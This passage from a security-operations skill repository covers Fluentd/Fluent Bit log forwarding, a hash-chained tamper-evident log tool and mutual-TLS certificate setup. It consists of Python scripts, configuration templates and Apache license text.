  <record>
    hostname "#{Socket.gethostname}"
  </record>
</filter>

<match **>
  @type elasticsearch
  host es.local
  port 9200
  logstash_format true
</match>
```

## Python fluent-logger

```python
from fluent import sender
from fluent import event

# Create sender (default: localhost:24224)
sender.setup('app', host='fluentd.local', port=24224)
event.Event('access', {'user': 'admin', 'action': 'login'})

# Direct sender usage
logger = sender.FluentSender('myapp', host='fluentd.local', port=24224)
logger.emit('follow', {'from': 'userA', 'to': 'userB'})
logger.close()
```

## Forward Protocol (TCP Port 24224)

Messages use MessagePack encoding: `[tag, timestamp, record]`

```bash
# Test connectivity
nc -zv fluentd.local 24224

# Monitor Fluentd buffer status
curl http://localhost:24220/api/plugins.json
```

===== END FILE =====


===== FILE: skills/implementing-log-forwarding-with-fluentd/scripts/agent.py =====
#!/usr/bin/env python3
"""Fluentd/Fluent Bit log forwarding configuration generator and tester."""

import json
import argparse
import socket
import time
from datetime import datetime

try:
    from fluent import sender, event
    HAS_FLUENT = True
except ImportError:
    HAS_FLUENT = False


def generate_fluentbit_config(inputs, output_host="127.0.0.1", output_port=24224):
    """Generate Fluent Bit configuration for log collection and forwarding."""
    sections = ["[SERVICE]\n    Flush        5\n    Daemon       Off\n    Log_Level    info\n    Parsers_File parsers.conf\n"]

    input_configs = {
        "syslog": "[INPUT]\n    Name         syslog\n    Tag          syslog.*\n    Listen       0.0.0.0\n    Port         5140\n    Mode         udp\n    Parser       syslog-rfc3164\n",
        "tail": "[INPUT]\n    Name         tail\n    Tag          file.*\n    Path         /var/log/*.log\n    DB           /var/log/flb_tail.db\n    Read_from_Head True\n    Refresh_Interval 10\n",
        "systemd": "[INPUT]\n    Name         systemd\n    Tag          systemd.*\n    Systemd_Filter _SYSTEMD_UNIT=sshd.service\n    Read_From_Tail On\n",
        "tcp": "[INPUT]\n    Name         tcp\n    Tag          tcp.*\n    Listen       0.0.0.0\n    Port         5170\n    Format       json\n",
    }

    for inp in inputs:
        if inp in input_configs:
            sections.append(input_configs[inp])

    sections.append(
        "[FILTER]\n"
        "    Name         record_modifier\n"
        "    Match        *\n"
        "    Record       hostname ${HOSTNAME}\n"
        "    Record       environment production\n"
    )
    sections.append(
        "[FILTER]\n"
        "    Name         grep\n"
        "    Match        syslog.*\n"
        "    Exclude      message ^healthcheck\n"
    )
    sections.append(
        f"[OUTPUT]\n"
        f"    Name         forward\n"
        f"    Match        *\n"
        f"    Host         {output_host}\n"
        f"    Port         {output_port}\n"
        f"    Retry_Limit  5\n"
    )
    return "\n".join(sections)


def generate_fluentd_config(outputs, bind_port=24224):
    """Generate Fluentd aggregator configuration."""
    sections = [
        f"<source>\n"
        f"  @type forward\n"
        f"  port {bind_port}\n"
        f"  bind 0.0.0.0\n"
        f"  <security>\n"
        f"    shared_key fluentd_secure_key_change_me\n"
        f"    self_hostname aggregator.local\n"
        f"  </security>\n"
        f"</source>\n",
    ]

    sections.append(
        "<filter **>\n"
        "  @type record_transformer\n"
        "  <record>\n"
        "    received_at ${time}\n"
        "    aggregator_host \"#{Socket.gethostname}\"\n"
        "  </record>\n"
        "</filter>\n"
    )

    output_configs = {
        "elasticsearch": (
            '<match **>\n'
            '  @type elasticsearch\n'
            '  host elasticsearch.local\n'
            '  port 9200\n'
            '  logstash_format true\n'
            '  logstash_prefix fluentd\n'
            '  include_tag_key true\n'
            '  <buffer>\n'
            '    @type file\n'
            '    path /var/log/fluentd/buffer/es\n'
            '    flush_interval 10s\n'
            '    chunk_limit_size 8MB\n'
            '    retry_max_interval 30\n'
            '    retry_forever true\n'
            '  </buffer>\n'
            '</match>\n'
        ),
        "s3": (
            '<match **>\n'
            '  @type s3\n'
            '  s3_bucket security-logs-bucket\n'
            '  s3_region us-east-1\n'
            '  path logs/\n'
            '  time_slice_format %Y%m%d%H\n'
            '  <buffer time>\n'
            '    @type file\n'
            '    path /var/log/fluentd/buffer/s3\n'
            '    timekey 3600\n'
            '    timekey_wait 10m\n'
            '  </buffer>\n'
            '</match>\n'
        ),
        "splunk": (
            '<match **>\n'
            '  @type splunk_hec\n'
            '  hec_host splunk.local\n'
            '  hec_port 8088\n'
            '  hec_token YOUR_HEC_TOKEN\n'
            '  index main\n'
            '  source fluentd\n'
            '  <buffer>\n'
            '    @type memory\n'
            '    flush_interval 5s\n'
            '  </buffer>\n'
            '</match>\n'
        ),
    }

    for out in outputs:
        if out in output_configs:
            sections.append(output_configs[out])

    return "\n".join(sections)


def validate_config(config_text, config_type="fluentbit"):
    """Validate configuration syntax for common issues."""
    errors = []
    lines = config_text.split("\n")
    open_sections = 0
    for i, line in enumerate(lines, 1):
        stripped = line.strip()
        if stripped.startswith("[") and stripped.endswith("]"):
            if config_type == "fluentbit":
                valid_sections = {"[SERVICE]", "[INPUT]", "[FILTER]", "[OUTPUT]", "[PARSER]"}
                if stripped not in valid_sections:
                    errors.append(f"Line {i}: Unknown section '{stripped}'")
        if stripped.startswith("<") and not stripped.startswith("</"):
            open_sections += 1
        if stripped.startswith("</"):
            open_sections -= 1
        if open_sections < 0:
            errors.append(f"Line {i}: Unexpected closing tag")

    if config_type == "fluentd" and open_sections != 0:
        errors.append(f"Unclosed XML-style tags: {open_sections} still open")

    return {"valid": len(errors) == 0, "errors": errors}


def send_test_event(host="127.0.0.1", port=24224, tag="test.event"):
    """Send a test log event to Fluentd/Fluent Bit via forward protocol."""
    if HAS_FLUENT:
        fluentd_sender = sender.FluentSender(tag, host=host, port=port)
        test_data = {
            "message": "Log forwarding test event",
            "level": "info",
            "source": "fluentd-agent",
            "timestamp": datetime.utcnow().isoformat(),
        }
        result = fluentd_sender.emit("test", test_data)
        fluentd_sender.close()
        return {"sent": result, "tag": f"{tag}.test", "data": test_data}

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        import msgpack
        timestamp = int(time.time())
        record = {"message": "test event", "source": "agent"}
        packed = msgpack.packb([tag, timestamp, record])
        sock.sendall(packed)
        sock.close()
        return {"sent": True, "method": "raw_msgpack"}
    except Exception as e:
        return {"sent": False, "error": str(e)}


def generate_report(fb_config, fd_config, fb_valid, fd_valid, test_result):
    """Generate deployment report."""
    return {
        "report_time": datetime.utcnow().isoformat(),
        "fluent_bit_config_lines": len(fb_config.split("\n")),
        "fluentd_config_lines": len(fd_config.split("\n")),
        "fluent_bit_validation": fb_valid,
        "fluentd_validation": fd_valid,
        "test_event_result": test_result,
        "topology": {
            "forwarders": "Fluent Bit (endpoints)",
            "aggregator": "Fluentd (central)",
            "protocol": "Forward (TCP:24224)",
        },
    }


def main():
    parser = argparse.ArgumentParser(description="Fluentd/Fluent Bit Log Forwarding Agent")
    parser.add_argument("--inputs", nargs="+", default=["syslog", "tail"],
                        choices=["syslog", "tail", "systemd", "tcp"],
                        help="Fluent Bit input plugins to enable")
    parser.add_argument("--outputs", nargs="+", default=["elasticsearch"],
                        choices=["elasticsearch", "s3", "splunk"],
                        help="Fluentd output destinations")
    parser.add_argument("--aggregator-host", default="127.0.0.1")
    parser.add_argument("--aggregator-port", type=int, default=24224)
    parser.add_argument("--test-send", action="store_true", help="Send a test event")
    parser.add_argument("--output", default="fluentd_report.json")
    parser.add_argument("--write-configs", action="store_true", help="Write config files to disk")
    args = parser.parse_args()

    fb_config = generate_fluentbit_config(args.inputs, args.aggregator_host, args.aggregator_port)
    fd_config = generate_fluentd_config(args.outputs, args.aggregator_port)
    fb_valid = validate_config(fb_config, "fluentbit")
    fd_valid = validate_config(fd_config, "fluentd")

    test_result = {}
    if args.test_send:
        test_result = send_test_event(args.aggregator_host, args.aggregator_port)

    if args.write_configs:
        with open("fluent-bit.conf", "w") as f:
            f.write(fb_config)
        with open("fluentd.conf", "w") as f:
            f.write(fd_config)
        print("[+] Written fluent-bit.conf and fluentd.conf")

    report = generate_report(fb_config, fd_config, fb_valid, fd_valid, test_result)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Fluent Bit: {len(args.inputs)} inputs, validation={'PASS' if fb_valid['valid'] else 'FAIL'}")
    print(f"[+] Fluentd: {len(args.outputs)} outputs, validation={'PASS' if fd_valid['valid'] else 'FAIL'}")
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-log-integrity-with-blockchain/SKILL.md =====
---
name: implementing-log-integrity-with-blockchain
description: >-
  Builds an append-only log integrity chain using SHA-256 hash chaining, where
  each entry incorporates the previous entry's hash so tampering invalidates all
  subsequent hashes; covers log ingestion (syslog/JSON/plain text), chain
  verification, pinpoint tamper detection, and checkpoint anchoring to external
  timestamping services. Use for tamper-evident log storage for compliance or
  forensics, or to verify whether log entries were altered.
domain: cybersecurity
subdomain: security-operations
tags:
- log-integrity
- tamper-detection
- hash-chaining
- sha-256
- audit-logging
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
---


# Implementing Log Integrity with Blockchain


## When to Use

- When deploying or configuring implementing log integrity with blockchain capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install requests`
2. Ingest log entries from syslog, JSON, or plain text files.
3. For each entry, compute SHA-256 hash of: previous_hash + timestamp + log_content.
4. Store the chain as a JSON ledger with entry index, timestamp, content hash, previous hash, and chain hash.
5. Verify chain integrity by recomputing all hashes and detecting breaks.
6. Optionally anchor checkpoint hashes to an external timestamping service.

```bash
python scripts/agent.py --log-file /var/log/syslog --chain-file log_chain.json --verify --output integrity_report.json
```

## Examples

### Chain Entry Structure
```json
{"index": 42, "timestamp": "2024-01-15T10:30:00Z", "content_hash": "a1b2c3...",
 "prev_hash": "d4e5f6...", "chain_hash": "SHA256(prev_hash + timestamp + content_hash)"}
```

### Tamper Detection
If entry 42 is modified, chain_hash[42] will not match SHA256(chain_hash[41] + ...), and all entries from 42 onward will be flagged as invalid.

===== END FILE =====


===== FILE: skills/implementing-log-integrity-with-blockchain/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-log-integrity-with-blockchain/references/api-reference.md =====
# API Reference: Log Integrity with Blockchain Hash Chaining

## hashlib - SHA-256 Hashing
```python
import hashlib
hash_hex = hashlib.sha256("data".encode("utf-8")).hexdigest()
# Returns 64-char hex string
```

## Chain Entry Structure
```json
{
  "index": 0,
  "timestamp": "2024-01-15T10:30:00.000Z",
  "content_hash": "SHA256(log_entry_text)",
  "prev_hash": "0000...0000 (genesis) or previous chain_hash",
  "chain_hash": "SHA256(prev_hash + timestamp + content_hash)",
  "content_preview": "first 200 chars of log entry"
}
```

## Chain Construction Algorithm
```
genesis_hash = "0" * 64
for each log_entry:
    content_hash = SHA256(log_entry)
    chain_hash = SHA256(prev_hash + timestamp + content_hash)
    store(index, timestamp, content_hash, prev_hash, chain_hash)
    prev_hash = chain_hash
```

## Verification Algorithm
```
prev_hash = genesis_hash
for each entry in chain:
    expected = SHA256(prev_hash + entry.timestamp + entry.content_hash)
    if expected != entry.chain_hash:
        TAMPER DETECTED at index
    prev_hash = entry.chain_hash
```

## Checkpoint Structure
```json
{
  "timestamp": "2024-01-15T12:00:00Z",
  "chain_length": 1000,
  "head_hash": "chain_hash of last entry",
  "head_index": 999,
  "checkpoint_hash": "SHA256(chain_length + head_hash)"
}
```

## Tamper Detection Properties
- Modifying any entry invalidates all subsequent chain_hashes
- First break index identifies the tampered entry
- Checkpoint comparison detects retroactive modifications

===== END FILE =====


===== FILE: skills/implementing-log-integrity-with-blockchain/scripts/agent.py =====
#!/usr/bin/env python3
"""Log Integrity Chain Agent - Implements SHA-256 hash-chained append-only log for tamper detection."""

import json
import hashlib
import logging
import argparse
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

GENESIS_HASH = "0" * 64


def compute_hash(data):
    """Compute SHA-256 hash of a string."""
    return hashlib.sha256(data.encode("utf-8")).hexdigest()


def create_chain_entry(index, timestamp, content, prev_hash):
    """Create a single chain entry with hash linking."""
    content_hash = compute_hash(content)
    chain_input = f"{prev_hash}{timestamp}{content_hash}"
    chain_hash = compute_hash(chain_input)
    return {
        "index": index,
        "timestamp": timestamp,
        "content_hash": content_hash,
        "prev_hash": prev_hash,
        "chain_hash": chain_hash,
        "content_preview": content[:200],
    }


def load_chain(chain_file):
    """Load an existing hash chain from a JSON file."""
    try:
        with open(chain_file, "r") as f:
            chain = json.load(f)
        logger.info("Loaded chain with %d entries from %s", len(chain), chain_file)
        return chain
    except FileNotFoundError:
        logger.info("No existing chain found, starting new chain")
        return []


def save_chain(chain, chain_file):
    """Save the hash chain to a JSON file."""
    with open(chain_file, "w") as f:
        json.dump(chain, f, indent=2)
    logger.info("Saved chain with %d entries to %s", len(chain), chain_file)


def ingest_log_file(log_file):
    """Read log entries from a file (one entry per line)."""
    entries = []
    with open(log_file, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line:
                entries.append(line)
    logger.info("Read %d log entries from %s", len(entries), log_file)
    return entries


def ingest_json_log(json_file):
    """Read structured log entries from a JSON array file."""
    with open(json_file, "r") as f:
        data = json.load(f)
    entries = []
    if isinstance(data, list):
        for item in data:
            entries.append(json.dumps(item, sort_keys=True))
    logger.info("Read %d JSON log entries from %s", len(entries), json_file)
    return entries


def append_entries(chain, log_entries):
    """Append new log entries to the hash chain."""
    prev_hash = chain[-1]["chain_hash"] if chain else GENESIS_HASH
    start_index = len(chain)
    new_entries = []
    for i, content in enumerate(log_entries):
        timestamp = datetime.utcnow().isoformat() + "Z"
        entry = create_chain_entry(start_index + i, timestamp, content, prev_hash)
        chain.append(entry)
        new_entries.append(entry)
        prev_hash = entry["chain_hash"]
    logger.info("Appended %d entries to chain (total: %d)", len(new_entries), len(chain))
    return new_entries


def verify_chain(chain):
    """Verify the integrity of the entire hash chain."""
    if not chain:
        return {"valid": True, "entries_checked": 0, "breaks": []}
    breaks = []
    prev_hash = GENESIS_HASH
    for entry in chain:
        expected_input = f"{prev_hash}{entry['timestamp']}{entry['content_hash']}"
        expected_hash = compute_hash(expected_input)
        if entry["chain_hash"] != expected_hash:
            breaks.append({
                "index": entry["index"],
                "expected_hash": expected_hash,
                "actual_hash": entry["chain_hash"],
                "prev_hash_match": entry["prev_hash"] == prev_hash,
            })
        if entry["prev_hash"] != prev_hash:
            breaks.append({
                "index": entry["index"],
                "issue": "prev_hash mismatch",
                "expected_prev": prev_hash,
                "actual_prev": entry["prev_hash"],
            })
        prev_hash = entry["chain_hash"]
    valid = len(breaks) == 0
    logger.info("Chain verification: %d entries checked, %d breaks found", len(chain), len(breaks))
    return {"valid": valid, "entries_checked": len(chain), "breaks": breaks}


def find_tampered_range(breaks):
    """Identify the range of entries affected by tampering."""
    if not breaks:
        return None
    first_break = min(b["index"] for b in breaks)
    return {
        "first_tampered_entry": first_break,
        "total_affected": len(breaks),
        "tamper_start_index": first_break,
        "note": f"All entries from index {first_break} onward may be compromised",
    }


def create_checkpoint(chain, checkpoint_file):
    """Create an integrity checkpoint with the current chain head hash."""
    if not chain:
        return None
    checkpoint = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "chain_length": len(chain),
        "head_hash": chain[-1]["chain_hash"],
        "head_index": chain[-1]["index"],
        "genesis_hash": GENESIS_HASH,
        "checkpoint_hash": compute_hash(f"{len(chain)}{chain[-1]['chain_hash']}"),
    }
    with open(checkpoint_file, "w") as f:
        json.dump(checkpoint, f, indent=2)
    logger.info("Created checkpoint at index %d: %s", checkpoint["head_index"], checkpoint["checkpoint_hash"][:16])
    return checkpoint


def verify_checkpoint(chain, checkpoint_file):
    """Verify chain against a previously saved checkpoint."""
    with open(checkpoint_file, "r") as f:
        checkpoint = json.load(f)
    cp_index = checkpoint["head_index"]
    if cp_index >= len(chain):
        return {"valid": False, "error": "Chain shorter than checkpoint"}
    actual_hash = chain[cp_index]["chain_hash"]
    valid = actual_hash == checkpoint["head_hash"]
    return {
        "valid": valid,
        "checkpoint_index": cp_index,
        "expected_hash": checkpoint["head_hash"],
        "actual_hash": actual_hash,
    }


def generate_report(verification, checkpoint, chain_length):
    """Generate log integrity verification report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "chain_length": chain_length,
        "integrity_valid": verification["valid"],
        "entries_checked": verification["entries_checked"],
        "breaks_found": len(verification["breaks"]),
        "break_details": verification["breaks"][:20],
        "checkpoint": checkpoint,
    }
    status = "INTACT" if verification["valid"] else "TAMPERED"
    print(f"LOG INTEGRITY: {status} - {chain_length} entries, {len(verification['breaks'])} breaks")
    return report


def main():
    parser = argparse.ArgumentParser(description="Log Integrity Chain Agent")
    parser.add_argument("--log-file", help="Log file to ingest")
    parser.add_argument("--chain-file", default="log_chain.json", help="Hash chain storage file")
    parser.add_argument("--verify", action="store_true", help="Verify chain integrity")
    parser.add_argument("--checkpoint", help="Create/verify checkpoint file")
    parser.add_argument("--output", default="integrity_report.json")
    args = parser.parse_args()

    chain = load_chain(args.chain_file)

    if args.log_file:
        entries = ingest_log_file(args.log_file)
        append_entries(chain, entries)
        save_chain(chain, args.chain_file)

    verification = {"valid": True, "entries_checked": 0, "breaks": []}
    if args.verify:
        verification = verify_chain(chain)

    checkpoint = None
    if args.checkpoint:
        if args.verify:
            checkpoint = verify_checkpoint(chain, args.checkpoint)
        else:
            checkpoint = create_checkpoint(chain, args.checkpoint)

    report = generate_report(verification, checkpoint, len(chain))
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-mtls-for-zero-trust-services/SKILL.md =====
---
name: implementing-mtls-for-zero-trust-services
description: 'Configures mutual TLS (mTLS) authentication between microservices using
  Python cryptography library for certificate generation and ssl module for TLS verification.
  Validates certificate chains, checks expiration, and audits mTLS deployment status.
  Use when implementing zero-trust service-to-service authentication.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- mtls
- zero-trust
- mutual-tls
- service-authentication
- certificate-management
- microservices-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1553
- T1573
---

# Implementing mTLS for Zero Trust Services


## When to Use

- When deploying or configuring implementing mtls for zero trust services capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Generate CA certificates, issue service certificates, and configure mutual TLS
verification for service-to-service authentication.

```python
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

# Generate CA key and certificate
ca_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
ca_cert = (x509.CertificateBuilder()
    .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Internal CA")]))
    .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Internal CA")]))
    .public_key(ca_key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
    .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
    .sign(ca_key, hashes.SHA256()))
```

## Examples

```python
import ssl
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_cert_chain("client.pem", "client-key.pem")
context.load_verify_locations("ca.pem")
context.verify_mode = ssl.CERT_REQUIRED
```

===== END FILE =====


===== FILE: skills/implementing-mtls-for-zero-trust-services/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
